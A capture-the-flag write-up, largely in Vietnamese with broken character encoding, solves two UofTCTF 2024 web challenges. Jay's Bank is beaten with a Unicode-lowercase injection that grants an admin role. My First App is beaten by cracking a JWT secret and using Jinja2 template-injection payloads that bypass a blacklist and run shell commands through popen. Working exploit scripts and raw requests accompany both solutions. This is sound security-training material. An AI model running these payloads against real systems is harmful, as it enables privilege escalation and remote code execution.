---
title: "UofTCTF 2024"
layout: single
excerpt: "January 13, 2024 12:00 PM EST to January 14, 2024 11:59 PM EST üíª "
header:
show_date: true
classes: wide
header:
  teaser: "https://hackmd.io/_uploads/BkpzSDDYT.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/BkpzSDDYT.png">
</p>


# WEB challs
## Jay's Bank - 499 point

### Description
```
My bank is still in pre-alpha-alpha-alpha stage, but I'm sure it's secure enough to keep all of your information safe.

Author: SteakEnthusiast

http://34.123.200.191/

```

source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2024/uofTCTF2024/jays-bank.zip)

### Solution

Giao di·ªán trang web cung c·∫•p nh∆∞ sau: 

![Alt text](https://hackmd.io/_uploads/HkFS1vDFp.png)

V√¨ challenge n√†y cung c·∫•p source code n√™n ta s·∫Ω th·ª±c hi·ªán review source tr∆∞·ªõc.

Trong `CTF/uoftctf/jays-bank/routes/index.js`
ƒê·ªçc ƒëo·∫°n code sau c√≥ th·ªÉ th·∫•y ƒë·ªÉ c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c FLAG ta c·∫ßn m·ªôt t√†i kho·∫£n v·ªõi `role:admin` 

![Alt text](https://hackmd.io/_uploads/rJowkPwFa.png)

Nh∆∞ng m·∫∑c ƒë·ªãnh, khi ng∆∞·ªùi d√πng th·ª±c hi·ªán update profile s·∫Ω add th√™m m·ªôt `role:user`

![Alt text](https://hackmd.io/_uploads/SJmt1DPFp.png)

Ki·ªÉm tra trong database

![Alt text](https://hackmd.io/_uploads/HyScywvYp.png)

Ph√¢n t√≠ch m·ªôt ch√∫t trong h√†m `router.put("/profile", jwtAuth, async (req, res)` trong index.js
L·ªó h·ªïng trong th·ª≠ th√°ch n√†y xu·∫•t ph√°t t·ª´ v·ªã tr√≠ n√†y 

![Alt text](https://hackmd.io/_uploads/H1_okPPY6.png)

app th·ª±c hi·ªán l·∫•y c√°c th√¥ng tin `username, phone, credit_card, secret_question, secret_answer` v√† add th√™m m·ªôt `role:user`. Trong ƒë√≥ g·ªçi t·ªõi hai h√†m `updateData` ƒë·ªÉ c·∫≠p nh·∫≠t data user v√†o database

![Alt text](https://hackmd.io/_uploads/Hyw31vDK6.png)

v√† h√†m `convert` nh·∫≠n v√†o m·ªôt ƒë·ªëi t∆∞·ª£ng (object) `o` v√† tr·∫£ v·ªÅ m·ªôt chu·ªói JSON ƒë∆∞·ª£c t·∫°o ra t·ª´ c√°c c·∫∑p kh√≥a-gi√° tr·ªã c·ªßa ƒë·ªëi t∆∞·ª£ng ƒë√≥

```js
  convert(o) {
    return `{${Object.entries(o).map(([k, v]) => 
      `"${k}": ${typeof v === "object" && v !== null ? convert(v) : `"${v}"`}`
    ).join(", ")}}`.toLowerCase();
  }
```

Cu·ªëi c√πng h√†m th·ª±c hi·ªán chuy·ªÉn k·∫øt qu·∫£ json v·ªÅ d·∫°ng LowerCase() tr·∫£ v·ªÅ m·ªôt kh·ªëi `data` v√† update data n√†y cho user trong database.

Trong file `init.sql` ƒë·ªãnh nghƒ©a ƒë·ªô d√†i t·ªëi ƒëa cho tr∆∞·ªùng data n√†y l√† `255`. 

![Alt text](https://hackmd.io/_uploads/r1F6kwDFp.png)

√ù t∆∞·ªüng khai th√°c:
- C√°c tr∆∞·ªùng `secret_answer` v√† `role: "user"` ƒë∆∞·ª£c insert g·∫ßn nhau, trong ƒë√≥ tr∆∞·ªùng secret_answer c√≥ kh·∫£ nƒÉng ki·ªÉm so√°t. ƒê·ªÉ khai th√°c th√†nh c√¥ng, ch√∫ng ta c·∫ßn ch√®n m·ªôt chu·ªói secret_answer ƒë·ªß d√†i v·ª´a ƒë·ªß ƒë·ªÉ ch√®n ƒë∆∞·ª£c role m·ªõi v√† x√≥a b·ªè role:user c≈© , t·ª´ ƒë√≥ ghi ƒë√® l√™n m·ªôt tr∆∞·ªùng role kh√°c v·ªõi gi√° tr·ªã l√† `admin`.

- Tr∆∞·ªõc ƒë√≥, `secret_answer` v√† `secret_question` c≈©ng ph·∫£i v∆∞·ª£t qua c√°c ƒëi·ªÅu ki·ªán check sao cho kh√¥ng v∆∞·ª£t qu√° 45 k√Ω t·ª± b·∫±ng c√°ch s·ª≠ d·ª•ng c√°c k√Ω t·ª± Unicode ƒë·∫∑c bi·ªát nh∆∞ `ƒ∞` c√≥ th·ªÉ l√†m tƒÉng k√≠ch th∆∞·ªõc khi ƒëi qua h√†m `toLowerCase()`

```
C√≥ m·ªôt s·ªë k√Ω t·ª± ƒë·∫∑c bi·ªát trong JavaScript

ƒê·ªëi v·ªõi toUpperCase():
C√°c k√Ω t·ª± ‚Äúƒ±‚Äù v√† ‚Äú≈ø‚Äù ƒë∆∞·ª£c toUpperCase x·ª≠ l√Ω v√† k·∫øt qu·∫£ l√† ‚ÄúI‚Äù v√† ‚ÄúS‚Äù

ƒê·ªëi v·ªõi toLowerCase():
K√Ω t·ª± ‚ÄúK‚Äù ƒë∆∞·ª£c toLowerCase x·ª≠ l√Ω v√† k·∫øt qu·∫£ l√† ‚Äúk‚Äù (K n√†y kh√¥ng ph·∫£i l√† K)
```

### Script
```python
import requests

url = "http://127.0.0.1:3000/"

session = requests.session()

session.post(url + 'register', json={"password": "Abc@123!@#", "username": "abc9092909078"})

session.post(url + 'login', json={"username":"abc9092909078","password":"Abc@123!@#"})

session.put(url + 'profile', json={"phone":"1234567890","credit_card":"1234567890987654","secret_question":"ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞","secret_answer":"ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞ƒ∞\",\"role\":\"admin\"}","current_password":"Abc@123!@#"})

res = session.get(url + 'dashboard')

print(res.text)
```

Result:
```
|_>kali: python 1.py

<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Jay's Bank</title>
    <link rel="stylesheet" href="/css/dashboard.css">
</head>
<body>
    <div class="container">
        <nav>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/profile">Edit Profile</a></li>
                <li><a href="/logout">Logout</a></li>
            </ul>
        </nav>
        <h1>Welcome, abc9092909078</h1>
        <p>Your phone number: 1234567890</p>
        <p>Your credit card (last 4 digits): 7654</p>
        
            <p>Since you're the admin, here is your flag: uoftctf{fake_flag}</p>
        
    </div>
</body>
</html>
```

## My First App - 494 point
### Description

```
I'm not much of a web developer, so my friends advised me to pay for a very expensive firewall to keep my first app secure from pesky hackers. Come check it out!

Author: SteakEnthusiast

https://uoftctf-my-first-app.chals.io/
```

### Solution

Jinja2 SSTI in jwt token

![image](https://hackmd.io/_uploads/BJVMMdvY6.png)

Create user

![image](https://hackmd.io/_uploads/Bk2NMdwta.png)

Th·ª≠ ch√®n payload ngay t·ª´ khi t·∫°o ng∆∞·ªùi d√πng

![image](https://hackmd.io/_uploads/SkF17uwF6.png)

Using `join` ƒë·ªÉ creak jwt t√¨m secret key

```
‚îî‚îÄ$ john john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
torontobluejays  (?)     
1g 0:00:00:00 DONE (2024-01-18 22:54) 4.166g/s 13107Kp/s 13107Kc/s 13107KC/s totohot1..tomaatti1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

S·ª≠ d·ª•ng secret key ch√®n m·ªôt m·ªôt payload m·ªõi `{{3*3}}`

![image](https://hackmd.io/_uploads/rJxcXdDKT.png)

Result

![image](https://hackmd.io/_uploads/B1SoX_vYa.png)

Tuy nhi√™n, blacklist kh√° ch·∫∑t nh∆∞ng v·∫´n c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c c√°c request v√† string ƒë·ªÉ crete payload.

Th·ª≠ s·ª≠ d·ª•ng request ƒë·ªÉ g·ªçi m·ªôt tham s·ªë t·ª´ parameter `request|attr(request.headers.c)`

![image](https://hackmd.io/_uploads/BJOIV_vYp.png)

B·ªã block.

Tra t√†i li·ªáu v·ªÅ flask request ƒë·ªÉ t√¨m m·ªôt s·ªë subclass kh√°c. 

`https://tedboy.github.io/flask/generated/generated/flask.Request.html`

![image](https://hackmd.io/_uploads/S1JA4uvtT.png)

nh·∫≠n th·∫•y m·ªôt s·ªë subclass nh∆∞ `authorization`, `pragma`, `referrer`... kh√¥ng b·ªã block


L·∫•y m·ªôt payload g·ªëc t·∫°i ƒë√¢y: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

v√≠ d·ª•: `{{ lipsum.__globals__["os"].popen('id').read() }}`

t·∫°o m·ªôt payload s·ª≠ d·ª•ng request ƒë·ªÉ g·ªçi data t·ª´ http header v·ªÅ x·ª≠ l√Ω 

```
{{lipsum|attr(request.referrer.split().pop(0))|attr(request.referrer.split().pop(1))(request.referrer.split().pop(2))|attr(request.referrer.split().pop(3))(request.referrer.split().pop(4))|attr(request.referrer.split().pop(5))()}}
```

ch√®n payload v√†o th·∫ª `referrer` ho·∫∑c `pragma`, ... 

```
Referer: __globals__ __getitem__ os popen cat<flag.txt read 
```

![image](https://hackmd.io/_uploads/HJl5AdDK6.png)

flag: `uoftctf{That_firewall_salesperson_scammed_me_:(}`

m·ªôt c√°ch kh√°c s·ª≠ d·ª•ng n·ªëi chu·ªói: `{{()|attr((request|string).17~(request|string).18}}`

### Tham kh·∫£o writeup:

from @steakenthusiast
```
{{(((((((2 | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(0)))) |attr((request | attr(request.referrer)).get(request.referrer | attr(request.pragma)(0)))() | attr(request.pragma)(1) | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(1)))() | attr(request.pragma)(239) | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(2))) | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(3)))).get((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(4))) | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(5))) ).get((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(6))) | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(7)))))((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(8)))) | attr((request | attr(request.referrer)).get((request.mimetype | attr(request.pragma))(9))))()}}

GET /dashboard HTTP/1.1
Host: 127.0.0.1:1337
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Int7KCgoKCgoKDIgfCBhdHRyKChyZXF1ZXN0IHwgYXR0cihyZXF1ZXN0LnJlZmVycmVyKSkuZ2V0KChyZXF1ZXN0Lm1pbWV0eXBlIHwgYXR0cihyZXF1ZXN0LnByYWdtYSkpKDApKSkpIHxhdHRyKChyZXF1ZXN0IHwgYXR0cihyZXF1ZXN0LnJlZmVycmVyKSkuZ2V0KHJlcXVlc3QucmVmZXJyZXIgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSgwKSkpKCkgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSgxKSB8IGF0dHIoKHJlcXVlc3QgfCBhdHRyKHJlcXVlc3QucmVmZXJyZXIpKS5nZXQoKHJlcXVlc3QubWltZXR5cGUgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSkoMSkpKSgpIHwgYXR0cihyZXF1ZXN0LnByYWdtYSkoMjM5KSB8IGF0dHIoKHJlcXVlc3QgfCBhdHRyKHJlcXVlc3QucmVmZXJyZXIpKS5nZXQoKHJlcXVlc3QubWltZXR5cGUgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSkoMikpKSB8IGF0dHIoKHJlcXVlc3QgfCBhdHRyKHJlcXVlc3QucmVmZXJyZXIpKS5nZXQoKHJlcXVlc3QubWltZXR5cGUgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSkoMykpKSkuZ2V0KChyZXF1ZXN0IHwgYXR0cihyZXF1ZXN0LnJlZmVycmVyKSkuZ2V0KChyZXF1ZXN0Lm1pbWV0eXBlIHwgYXR0cihyZXF1ZXN0LnByYWdtYSkpKDQpKSkgfCBhdHRyKChyZXF1ZXN0IHwgYXR0cihyZXF1ZXN0LnJlZmVycmVyKSkuZ2V0KChyZXF1ZXN0Lm1pbWV0eXBlIHwgYXR0cihyZXF1ZXN0LnByYWdtYSkpKDUpKSkgKS5nZXQoKHJlcXVlc3QgfCBhdHRyKHJlcXVlc3QucmVmZXJyZXIpKS5nZXQoKHJlcXVlc3QubWltZXR5cGUgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSkoNikpKSB8IGF0dHIoKHJlcXVlc3QgfCBhdHRyKHJlcXVlc3QucmVmZXJyZXIpKS5nZXQoKHJlcXVlc3QubWltZXR5cGUgfCBhdHRyKHJlcXVlc3QucHJhZ21hKSkoNykpKSkpKChyZXF1ZXN0IHwgYXR0cihyZXF1ZXN0LnJlZmVycmVyKSkuZ2V0KChyZXF1ZXN0Lm1pbWV0eXBlIHwgYXR0cihyZXF1ZXN0LnByYWdtYSkpKDgpKSkpIHwgYXR0cigocmVxdWVzdCB8IGF0dHIocmVxdWVzdC5yZWZlcnJlcikpLmdldCgocmVxdWVzdC5taW1ldHlwZSB8IGF0dHIocmVxdWVzdC5wcmFnbWEpKSg5KSkpKSgpfX0ifQ.WOuqHapUXNcwWl7qGvleiDJkpoBUwSCMggc3wUGbIps
Pragma: __getitem__
Content-Type: 0123456789
Referer: headers
h: mro
0: __class__
1: __subclasses__
2: __init__
3: __globals__
4: sys
5: modules
6: os
7: popen
8: cat flag.txt
9: read
Content-Length: 0
```

from spencerpogo

```py
import requests
import sys
import json
from base64 import b64encode, urlsafe_b64encode
import hmac

from lxml import html

header = b"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
jwt_secret = b"torontobluejays"


def jwt_b64e(data: bytes) -> bytes:
    return urlsafe_b64encode(data).rstrip(b"=")


def gen_jwt(payload):
    payload_enc = json.dumps(payload).encode()
    payload_b64 = jwt_b64e(payload_enc)
    msg = header + b"." + payload_b64
    sig = jwt_b64e(hmac.digest(jwt_secret, msg, "sha256"))
    return (msg + b"." + sig).decode()


def test_payload(payload):
    jwt = gen_jwt({"username": payload})
    r = requests.get(
        "https://uoftctf-my-first-app.chals.io/dashboard",
        cookies={"auth_token": jwt},
        headers={
            "Referer":"__globals__",
            "Content-Type":"__getitem__",
            "Authorization": "Basic " + b64encode(b"popen:cat flag.txt").decode(),
        }
    )
    r.raise_for_status()
    root = html.fromstring(r.content)
    container = root.xpath("//div[@class='form-container']")[0]
    print("\n".join(l.strip() for l in container.text_content().strip().split("\n")))
    print()
    print(html.tostring(container).decode())


def gen_payload():
    #templ = f"request.mimetype|string"
    r_globals = "(lipsum|attr(request.referrer))"
    os_str = f"{r_globals}|batch(7)|min|batch(4)|max|min|string"
    os_module = f"({r_globals}|attr(request.mimetype))({os_str})"
    templ = f"({os_module}|attr(request.authorization.username))(request.authorization.password).read()|string"
    return "{{" + templ + "}}"


if __name__ == "__main__":
    payload = gen_payload()
    print(json.dumps(payload))
    print()
    test_payload(payload)
```

